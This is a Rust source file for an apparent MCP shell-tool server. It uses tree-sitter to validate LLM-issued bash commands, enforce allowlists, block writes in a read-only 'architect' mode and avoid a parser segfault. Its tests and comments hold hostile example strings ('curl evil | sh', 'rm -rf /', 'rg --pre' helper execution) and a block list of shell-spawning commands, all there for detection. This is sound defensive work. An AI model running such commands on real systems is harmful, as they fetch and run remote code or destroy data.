use std::borrow::Cow;

use tree_sitter::{Node, Parser};

use crate::errors::{Result, WinxError};

/// Replace supplementary-plane code points (>= U+10000, i.e. 4-byte UTF-8) with
/// U+FFFD before handing text to tree-sitter-bash.
///
/// The grammar's C external scanner reads out of bounds on a supplementary-plane
/// char next to brace context and SIGSEGVs the process — a fatal, NON-deterministic
/// crash (verified by fuzzing: BMP input never triggered it; supplementary input
/// crashed ~64% of the time). Under `panic = "abort"` that segfault takes the whole
/// MCP server down, so a single crafted `BashCommand` is a remote denial of service.
///
/// We only parse for *structure* (statement count, command names), so swapping these
/// rare chars for U+FFFD is invisible to the caller: `bash -n` and the actual
/// execution still see the original command (emoji and all). Returns `Cow::Borrowed`
/// for the overwhelmingly common all-BMP case, so there's no cost on the hot path.
fn neutralize_supplementary(command: &str) -> Cow<'_, str> {
    if command.chars().any(|c| c as u32 >= 0x1_0000) {
        Cow::Owned(
            command.chars().map(|c| if c as u32 >= 0x1_0000 { '\u{FFFD}' } else { c }).collect(),
        )
    } else {
        Cow::Borrowed(command)
    }
}

/// Validate that `command` is a single top-level bash statement.
///
/// `allow_shell_probe` controls the tree-sitter-error fallback: when the
/// embedded grammar flags an error, we *can* ask the real `bash -n -c` whether
/// the syntax is actually valid (the grammar lags real bash). That spawns a
/// shell on the request path, so it's gated to trusted (`wcgw`) mode only — in
/// restricted modes (`code_writer`/`architect`) we must not spawn `bash` to
/// vet a command, so tree-sitter's verdict is final there.
pub fn assert_single_statement(command: &str, allow_shell_probe: bool) -> Result<()> {
    let trimmed = command.trim();
    if trimmed.is_empty() {
        return Ok(());
    }
    if trimmed.contains('\0') {
        return Err(WinxError::CommandExecutionError(
            "Command contains a NUL byte. JSON escape \\u0000 becomes an actual NUL before bash sees it; write \\\\0 or \\\\x00 in the command string instead.".to_string(),
        ));
    }

    // Parse a copy with supplementary-plane chars neutralized (see
    // `neutralize_supplementary`): tree-sitter-bash segfaults on them. `bash -n`
    // below and the eventual execution still see the original `trimmed`.
    let parse_src = neutralize_supplementary(trimmed);

    let mut parser = Parser::new();
    let language: tree_sitter::Language = tree_sitter_bash::LANGUAGE.into();
    parser.set_language(&language).map_err(|error| {
        WinxError::CommandExecutionError(format!("Failed to load bash parser: {error}"))
    })?;

    let tree = parser.parse(parse_src.as_ref(), None).ok_or_else(|| {
        WinxError::CommandExecutionError("Failed to parse bash command".to_string())
    })?;
    let root = tree.root_node();

    if root.has_error() && !rescued_by_shell_probe(trimmed, allow_shell_probe) {
        return Err(WinxError::CommandExecutionError(
            "Command contains invalid bash syntax. If this is a complex script, pass it as multiline bash, avoid NUL bytes, or set allow_multi=true after verifying the quoting.".to_string(),
        ));
    }

    // `parse_src` (not `trimmed`): the node byte offsets index the parsed string.
    let statement_count = top_level_statement_count(parse_src.as_ref(), root);

    if statement_count > 1 && !trimmed.contains('\n') {
        return Err(WinxError::CommandExecutionError(
            "Command should contain a single top-level bash statement. Fix one of three ways: \
             send one statement per call; put each statement on its own line (multiline is \
             allowed); or resend as {\"type\": \"command\", \"command\": \"...\", \
             \"allow_multi\": true} when the composite is intentional."
                .to_string(),
        ));
    }

    Ok(())
}

/// When tree-sitter flags a syntax error we *may* defer to the real `bash -n`
/// (the embedded grammar lags real bash). That probe spawns a shell, so it only
/// runs in trusted (wcgw) mode — `allow_shell_probe` gates it. In restricted
/// modes (`code_writer`/`architect`) the grammar's verdict is final and we never
/// shell out to vet a command.
fn rescued_by_shell_probe(command: &str, allow_shell_probe: bool) -> bool {
    allow_shell_probe && bash_accepts_syntax(command)
}

fn bash_accepts_syntax(command: &str) -> bool {
    std::process::Command::new("bash")
        .arg("-n")
        .arg("-c")
        .arg(command)
        .status()
        .is_ok_and(|status| status.success())
}

#[derive(Debug, Clone)]
struct StatementNode {
    kind: String,
    start_byte: usize,
    end_byte: usize,
}

fn top_level_statement_count(source: &str, root: Node<'_>) -> usize {
    let mut statements = Vec::new();
    collect_statement_nodes(root, &mut statements);

    statements
        .iter()
        .filter(|stmt| stmt.kind != "comment")
        .filter(|stmt| !statements.iter().any(|other| is_contained_statement(source, stmt, other)))
        .count()
}

fn collect_statement_nodes(node: Node<'_>, statements: &mut Vec<StatementNode>) {
    if is_statement_node(node.kind()) {
        statements.push(StatementNode {
            kind: node.kind().to_string(),
            start_byte: node.start_byte(),
            end_byte: node.end_byte(),
        });
    }

    let child_count = u32::try_from(node.named_child_count()).unwrap_or(u32::MAX);
    for index in 0..child_count {
        if let Some(child) = node.named_child(index) {
            collect_statement_nodes(child, statements);
        }
    }
}

fn is_statement_node(kind: &str) -> bool {
    matches!(
        kind,
        "command"
            | "variable_assignment"
            | "declaration_command"
            | "unset_command"
            | "comment"
            | "for_statement"
            | "c_style_for_statement"
            | "while_statement"
            | "if_statement"
            | "case_statement"
            | "function_definition"
            | "pipeline"
            | "list"
            | "compound_statement"
            | "subshell"
            | "redirected_statement"
    )
}

fn is_contained_statement(source: &str, stmt: &StatementNode, other: &StatementNode) -> bool {
    if stmt.start_byte == other.start_byte
        && stmt.end_byte == other.end_byte
        && stmt.kind == other.kind
    {
        return false;
    }

    let other_text = &source[other.start_byte..other.end_byte];
    if other.kind == "list" && other_text.contains(';') {
        return false;
    }

    other.start_byte <= stmt.start_byte
        && other.end_byte >= stmt.end_byte
        && other.end_byte - other.start_byte > stmt.end_byte - stmt.start_byte
        && other_text.contains(&source[stmt.start_byte..stmt.end_byte])
}

/// Collect the full text of every `command` node in the script.
///
/// Descends through pipelines, lists, subshells, command/process substitution,
/// loops and conditionals, so an allowlist can be enforced against EVERY command
/// a line would run — not just `command_line.split_whitespace().next()`, which
/// `ls && curl|sh`, `ls $(rm -rf x)` and `a; rm -rf /` trivially bypass.
///
/// Returns `Err` when the command can't be parsed cleanly; restricted-mode
/// callers treat that as "not allowed" (fail closed). Code hidden inside a
/// quoted string (e.g. `bash -c '...'`) is opaque to the parser, so an allowlist
/// that permits `bash`/`sh`/`eval` stays effectively unrestricted by design.
pub fn extract_command_texts(command: &str) -> Result<Vec<String>> {
    let trimmed = command.trim();
    if trimmed.is_empty() {
        return Ok(Vec::new());
    }
    if trimmed.contains('\0') {
        return Err(WinxError::CommandExecutionError("Command contains a NUL byte.".to_string()));
    }

    // See `neutralize_supplementary`: parse a sanitized copy so a supplementary
    // code point can't segfault tree-sitter. The extracted command texts feed the
    // allowlist, which keys on the (ASCII) command name, so a U+FFFD standing in
    // for an emoji in some argument doesn't change enforcement.
    let parse_src = neutralize_supplementary(trimmed);

    let mut parser = Parser::new();
    let language: tree_sitter::Language = tree_sitter_bash::LANGUAGE.into();
    parser.set_language(&language).map_err(|error| {
        WinxError::CommandExecutionError(format!("Failed to load bash parser: {error}"))
    })?;

    let tree = parser.parse(parse_src.as_ref(), None).ok_or_else(|| {
        WinxError::CommandExecutionError("Failed to parse bash command".to_string())
    })?;
    let root = tree.root_node();
    if root.has_error() {
        return Err(WinxError::CommandExecutionError(
            "Command could not be parsed for allowlist enforcement.".to_string(),
        ));
    }

    let mut texts = Vec::new();
    collect_command_texts(root, parse_src.as_ref().as_bytes(), &mut texts);
    Ok(texts)
}

/// Return statically visible filesystem destinations written by a shell command.
///
/// This is deliberately conservative: dynamic expansions are ignored instead of
/// guessed, while output redirects and common file-producing commands expose
/// their literal destinations. Callers use the result for narrow path-policy
/// checks, never as a general shell sandbox.
pub fn extract_static_write_paths(command: &str) -> Vec<String> {
    let trimmed = command.trim();
    if trimmed.is_empty() || trimmed.contains('\0') {
        return Vec::new();
    }

    let parse_src = neutralize_supplementary(trimmed);
    let mut parser = Parser::new();
    let language: tree_sitter::Language = tree_sitter_bash::LANGUAGE.into();
    if parser.set_language(&language).is_err() {
        return Vec::new();
    }
    let Some(tree) = parser.parse(parse_src.as_ref(), None) else { return Vec::new() };

    let mut paths = Vec::new();
    collect_static_write_paths(tree.root_node(), parse_src.as_ref().as_bytes(), &mut paths);
    paths.sort();
    paths.dedup();
    paths
}

fn collect_static_write_paths(node: Node<'_>, src: &[u8], out: &mut Vec<String>) {
    match node.kind() {
        "file_redirect" => collect_redirect_destination(node, src, out),
        "command" => collect_command_destinations(node, src, out),
        _ => {}
    }

    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        collect_static_write_paths(child, src, out);
    }
}

fn collect_redirect_destination(node: Node<'_>, src: &[u8], out: &mut Vec<String>) {
    let Some(destination) = node.child_by_field_name("destination") else { return };
    let prefix_end = destination.start_byte().saturating_sub(node.start_byte());
    let Ok(redirect) = node.utf8_text(src) else { return };
    let prefix = redirect.get(..prefix_end).unwrap_or(redirect);
    if !prefix.contains('>') {
        return;
    }
    if let Ok(text) = destination.utf8_text(src) {
        push_static_shell_word(text, out);
    }
}

fn collect_command_destinations(node: Node<'_>, src: &[u8], out: &mut Vec<String>) {
    let Some(name) = node.child_by_field_name("name") else { return };
    let Ok(name) = name.utf8_text(src) else { return };
    let Some(name) = static_shell_word(name) else { return };
    let name = std::path::Path::new(&name)
        .file_name()
        .and_then(std::ffi::OsStr::to_str)
        .unwrap_or(name.as_str());

    let mut cursor = node.walk();
    let arguments = node
        .children_by_field_name("argument", &mut cursor)
        .filter_map(|argument| argument.utf8_text(src).ok())
        .filter_map(static_shell_word)
        .collect::<Vec<_>>();
    let positional =
        arguments.iter().filter(|argument| !argument.starts_with('-')).cloned().collect::<Vec<_>>();

    match name {
        "tee" | "touch" | "truncate" | "mkdir" | "mkfifo" => {
            out.extend(positional);
        }
        "cp" | "mv" | "install" | "ln" => {
            if let Some(destination) = positional.last() {
                out.push(destination.clone());
            }
            for argument in &arguments {
                if let Some(destination) = argument.strip_prefix("--target-directory=") {
                    out.push(destination.to_string());
                }
            }
        }
        "dd" => {
            for argument in &arguments {
                if let Some(destination) = argument.strip_prefix("of=") {
                    out.push(destination.to_string());
                }
            }
        }
        "sed" | "perl"
            if arguments.iter().any(|argument| {
                argument == "-i"
                    || argument.starts_with("-i")
                    || argument == "-pi"
                    || argument.starts_with("-pi")
            }) =>
        {
            out.extend(positional);
        }
        _ => {}
    }
}

fn push_static_shell_word(text: &str, out: &mut Vec<String>) {
    if let Some(word) = static_shell_word(text) {
        out.push(word);
    }
}

fn static_shell_word(text: &str) -> Option<String> {
    let text = text.trim();
    if text.is_empty() {
        return None;
    }

    let bytes = text.as_bytes();
    let unquoted = if bytes.len() >= 2
        && matches!(
            (bytes.first(), bytes.last()),
            (Some(b'\''), Some(b'\'')) | (Some(b'"'), Some(b'"'))
        ) {
        &text[1..text.len() - 1]
    } else {
        text
    };
    let known_temp_path = unquoted == "$WINX_TEMP_DIR"
        || unquoted == "${WINX_TEMP_DIR}"
        || unquoted.starts_with("$WINX_TEMP_DIR/")
        || unquoted.starts_with("${WINX_TEMP_DIR}/");
    if unquoted.is_empty()
        || unquoted.contains('`')
        || unquoted.contains('*')
        || unquoted.contains('?')
        || (unquoted.contains('$') && !known_temp_path)
        || (known_temp_path
            && unquoted
                .trim_start_matches("${WINX_TEMP_DIR}")
                .trim_start_matches("$WINX_TEMP_DIR")
                .contains('$'))
    {
        None
    } else {
        Some(unquoted.replace("\\ ", " ").replace("\\\"", "\"").replace("\\'", "'"))
    }
}

fn collect_command_texts(node: Node<'_>, src: &[u8], out: &mut Vec<String>) {
    if node.kind() == "command" {
        if let Ok(text) = node.utf8_text(src) {
            out.push(text.to_string());
        }
    }
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        collect_command_texts(child, src, out);
    }
}

/// Commands that can execute arbitrary code passed as a string argument.
///
/// If a `code_writer` allowlist permits any of these, the allowlist is
/// effectively unrestricted: the tree-sitter parser sees `bash -c '...'`,
/// `eval "..."`, `find -exec ...` or `xargs sh` as a single allowed command and
/// can't inspect the code hidden inside. This list backs an advisory warning,
/// not enforcement — enforcement stays fail-closed regardless.
pub const SHELL_SPAWNING_COMMANDS: &[&str] = &[
    "bash", "sh", "zsh", "dash", "ksh", "fish", "csh", "tcsh", "eval", "source", ".", "env",
    "xargs", "nice", "nohup", "timeout", "find", "watch", "sudo", "su", "ssh", "python", "python3",
    "perl", "ruby", "node", "deno", "awk", "gawk", "php", "lua",
];

/// Commands exposed by architect mode. This deliberately omits general-purpose
/// interpreters and utilities with write/exec primitives (`sed`, `awk`, `find`,
/// `tee`, ...). Bash restricted mode is only defense in depth: it does not make
/// ordinary commands such as `touch` or `rm` read-only.
pub const ARCHITECT_COMMANDS: &[&str] = &[
    "pwd",
    "ls",
    "rg",
    "grep",
    "head",
    "tail",
    "wc",
    "stat",
    "file",
    "readlink",
    "realpath",
    "basename",
    "dirname",
    "printf",
    "echo",
    "type",
    "which",
    "uname",
    "date",
    "id",
    "whoami",
    "du",
    "df",
    "tree",
    "git status",
    "git diff",
    "git log",
    "git show",
    "git ls-files",
    "git grep",
    "git rev-parse",
    "git branch --show-current",
];

pub fn architect_allowed_commands() -> Vec<String> {
    ARCHITECT_COMMANDS.iter().map(|command| (*command).to_string()).collect()
}

/// Fail-closed read-only policy for architect shell commands.
///
/// The normal allowlist checks every nested command, but a few nominally
/// read-only programs have options that execute helpers or write files. Validate
/// those options here as well so `rg --pre`, `git diff --ext-diff`, and
/// `git show --output=...` cannot turn the architect shell into a mutation path.
pub fn is_architect_command_allowed(command_line: &str) -> bool {
    if contains_file_redirect(command_line) {
        return false;
    }
    let Ok(commands) = extract_command_texts(command_line) else { return false };
    !commands.is_empty() && commands.iter().all(|command| architect_command_is_safe(command))
}

/// Reject shell-managed file redirects in architect mode. Even a harmless
/// command such as `echo` or `git diff` becomes a write primitive when followed
/// by `> file`; checking command names alone cannot see that side effect.
fn contains_file_redirect(command: &str) -> bool {
    let parse_src = neutralize_supplementary(command.trim());
    let mut parser = Parser::new();
    let language: tree_sitter::Language = tree_sitter_bash::LANGUAGE.into();
    if parser.set_language(&language).is_err() {
        return true;
    }
    let Some(tree) = parser.parse(parse_src.as_ref(), None) else { return true };
    let root = tree.root_node();
    root.has_error() || node_tree_contains_kind(root, "file_redirect")
}

fn node_tree_contains_kind(node: Node<'_>, kind: &str) -> bool {
    if node.kind() == kind {
        return true;
    }
    let mut cursor = node.walk();
    let found = node.children(&mut cursor).any(|child| node_tree_contains_kind(child, kind));
    found
}

fn architect_command_is_safe(command: &str) -> bool {
    let words: Vec<&str> = command.split_whitespace().collect();
    let Some(program) = words.first().copied() else { return false };

    if program == "git" {
        let Some(subcommand) = words.get(1).copied() else { return false };
        if subcommand == "branch" {
            return words.as_slice() == ["git", "branch", "--show-current"];
        }
        if !matches!(
            subcommand,
            "status" | "diff" | "log" | "show" | "ls-files" | "grep" | "rev-parse"
        ) {
            return false;
        }
        return !words.iter().skip(2).any(|word| {
            word.starts_with("--output")
                || *word == "--ext-diff"
                || *word == "--textconv"
                || word.starts_with("--open-files-in-pager")
        });
    }

    let allowed = ARCHITECT_COMMANDS
        .iter()
        .filter(|entry| !entry.starts_with("git "))
        .any(|entry| *entry == program);
    if !allowed {
        return false;
    }

    if program == "rg" {
        return !words.iter().skip(1).any(|word| {
            word == &"--pre"
                || word.starts_with("--pre=")
                || word == &"--hostname-bin"
                || word.starts_with("--hostname-bin=")
        });
    }

    true
}

/// Return the deduplicated allowlist entries that make a `code_writer` allowlist
/// bypassable (see [`SHELL_SPAWNING_COMMANDS`]).
///
/// The allowlist matches on command *name*, so we compare the basename of each
/// entry's first whitespace-delimited token: `find`, `/usr/bin/find` and
/// `find -exec rm {} +` all resolve to `find`.
pub fn detect_allowlist_bypass(allowed: &[String]) -> Vec<String> {
    let mut hits: Vec<String> = allowed
        .iter()
        .filter_map(|entry| {
            let first = entry.split_whitespace().next()?;
            let base = std::path::Path::new(first).file_name()?.to_str()?;
            SHELL_SPAWNING_COMMANDS.contains(&base).then(|| base.to_string())
        })
        .collect();
    hits.sort();
    hits.dedup();
    hits
}

#[cfg(test)]
mod tests {
    use super::assert_single_statement;
    use super::detect_allowlist_bypass;
    use super::extract_command_texts;
    use super::extract_static_write_paths;
    use super::is_architect_command_allowed;
    use proptest::prelude::*;

    proptest! {
        /// This gate parses untrusted LLM command strings with tree-sitter; under
        /// panic=abort, any panic here crashes the server. It must only ever return
        /// Ok/Err — never panic — for ANY input (incl. multiline, control chars, junk).
        #[test]
        fn assert_single_statement_never_panics(cmd in "[\\s\\S]{0,80}") {
            let _ = assert_single_statement(&cmd, false);
            let _ = assert_single_statement(&cmd, true);
        }

        #[test]
        fn extract_command_texts_never_panics(cmd in "[\\s\\S]{0,80}") {
            let _ = extract_command_texts(&cmd);
        }

        #[test]
        fn extract_static_write_paths_never_panics(cmd in "[\\s\\S]{0,80}") {
            let _ = extract_static_write_paths(&cmd);
        }
    }

    #[test]
    fn supplementary_plane_input_does_not_segfault_the_parser() {
        // Regression: `{` followed by a supplementary-plane code point (>= U+10000)
        // made tree-sitter-bash's C scanner read out of bounds and SIGSEGV the whole
        // process (a fatal, non-deterministic DoS under panic=abort). Both parse paths
        // must now return cleanly. Run the minimal trigger many times to beat the
        // non-determinism, plus a few representative supplementary chars.
        for c in ['\u{10FFFF}', '\u{4E980}', '\u{1F574}', '\u{100000}'] {
            for _ in 0..40 {
                let cmd = format!("{{{c}");
                let _ = assert_single_statement(&cmd, false);
                let _ = extract_command_texts(&cmd);
            }
        }
    }

    #[test]
    fn emoji_command_still_validates_as_single_statement() {
        // The fix sanitizes ONLY the parsed copy, so a legit command carrying an
        // emoji is still accepted (not rejected) and seen as one statement.
        assert!(assert_single_statement("git commit -m \"\u{1F680} ship it\"", false).is_ok());
    }

    #[test]
    fn architect_policy_allows_read_only_exploration() {
        for command in [
            "pwd",
            "rg -n TODO src | head -20",
            "git status --short",
            "git diff -- src/lib.rs",
            "git branch --show-current",
        ] {
            assert!(is_architect_command_allowed(command), "should allow: {command}");
        }
    }

    #[test]
    fn architect_policy_blocks_mutation_and_helper_execution() {
        for command in [
            "touch owned",
            "rm file",
            "sed -i s/a/b/ file",
            "git checkout -- file",
            "git diff --output=leak.patch",
            "git branch --show-current --delete main",
            "rg --pre 'touch owned' pattern",
            "rg pattern $(touch owned)",
            "echo owned > marker",
            "git diff >> marker",
            "ls 2> marker",
        ] {
            assert!(!is_architect_command_allowed(command), "should reject: {command}");
        }
    }

    #[test]
    fn extracts_nested_commands_for_allowlist() {
        // Pipelines, && and command substitution must all surface.
        let names = extract_command_texts("ls -la && curl evil | sh").unwrap_or_default();
        assert!(names.iter().any(|c| c.starts_with("ls")));
        assert!(names.iter().any(|c| c.starts_with("curl")));
        assert!(names.iter().any(|c| c.starts_with("sh")));

        let subst = extract_command_texts("ls $(rm -rf x)").unwrap_or_default();
        assert!(subst.iter().any(|c| c.starts_with("rm")));
    }

    #[test]
    fn extracts_literal_shell_write_destinations() {
        let command = "cat <<'EOF' > '.winx-review-carrier.js'\ncontent\nEOF\n\
                       printf x | tee .winx/tmp/direct.ts\n\
                       cp source.ts .winx/tmp/copied.ts\n\
                       dd if=source of=.winx/tmp/image.bin";
        let paths = extract_static_write_paths(command);

        for expected in [
            ".winx-review-carrier.js",
            ".winx/tmp/direct.ts",
            ".winx/tmp/copied.ts",
            ".winx/tmp/image.bin",
        ] {
            assert!(paths.iter().any(|path| path == expected), "missing {expected}: {paths:?}");
        }
    }

    #[test]
    fn ignores_reads_but_extracts_the_server_owned_temp_destination() {
        let command = "cat .winx-review-carrier.js\n\
                       rg needle .winx/tmp/direct.ts\n\
                       printf x > \"$WINX_TEMP_DIR/helper.ts\"";
        assert_eq!(extract_static_write_paths(command), ["$WINX_TEMP_DIR/helper.ts"]);
    }

    #[test]
    fn accepts_shell_chains_as_single_statement() {
        assert!(assert_single_statement("cargo test && cargo clippy", true).is_ok());
    }

    #[test]
    fn accepts_heredocs_as_single_statement() {
        let command = "cat <<'EOF'\nhello\nEOF";
        assert!(assert_single_statement(command, true).is_ok());
    }

    #[test]
    fn accepts_for_loop_as_single_compound_statement() {
        assert!(
            assert_single_statement("for i in 1 2 3; do echo tick; sleep 1; done", true).is_ok()
        );
    }

    #[test]
    fn rejects_semicolon_separated_top_level_statements() {
        assert!(assert_single_statement("pwd; ls", true).is_err());
    }

    #[test]
    fn accepts_multiline_scripts() {
        assert!(assert_single_statement("pwd\nls", true).is_ok());
    }

    #[test]
    fn accepts_bash_lc_script_when_tree_sitter_reports_error() {
        let command = "bash -lc 'printf \"%s\\n\" \"-- drm connectors --\"; for s in /sys/class/drm/card*-*/status; do [ -e \"$s\" ] || continue; c=${s%/status}; printf \"%s: %s\" \"${c##*/}\" \"$(cat \"$s\")\"; done'";
        assert!(assert_single_statement(command, true).is_ok());
    }

    #[test]
    fn shell_probe_is_gated_to_trusted_mode() {
        use super::rescued_by_shell_probe;
        // The probe (`bash -n`) only runs in trusted (wcgw) mode. Tested on the
        // pure decision so it doesn't depend on finding a command the embedded
        // grammar happens to reject — which is the whole point of the gate.
        //
        // Probe ON: a command real bash accepts is rescued past a tree-sitter error.
        assert!(rescued_by_shell_probe("echo hi", true));
        // Probe OFF (restricted modes): NOT rescued, even though bash would accept
        // it — and crucially we never spawn a shell to find out.
        assert!(!rescued_by_shell_probe("echo hi", false));
        // Probe ON but genuinely broken syntax: bash rejects too, so no rescue.
        assert!(!rescued_by_shell_probe("echo )(", true));
    }

    #[test]
    fn detect_allowlist_bypass_flags_shell_spawners() {
        let allowed = vec![
            "ls".to_string(),
            "bash".to_string(),
            "cat -n".to_string(),
            "find . -exec rm {} +".to_string(),
        ];
        assert_eq!(detect_allowlist_bypass(&allowed), vec!["bash".to_string(), "find".to_string()]);
    }

    #[test]
    fn detect_allowlist_bypass_clean_list_is_empty() {
        let allowed = vec!["ls".to_string(), "cat".to_string(), "grep -n foo".to_string()];
        assert!(detect_allowlist_bypass(&allowed).is_empty());
    }

    #[test]
    fn detect_allowlist_bypass_matches_basename_of_path() {
        let allowed = vec!["/usr/bin/env python".to_string()];
        assert_eq!(detect_allowlist_bypass(&allowed), vec!["env".to_string()]);
    }

    #[test]
    fn rejects_nul_with_actionable_message() {
        let error = match assert_single_statement("printf '\0'", true) {
            Ok(()) => String::new(),
            Err(error) => error.to_string(),
        };
        assert!(error.contains("NUL byte"));
        assert!(error.contains("\\\\x00"));
    }
}
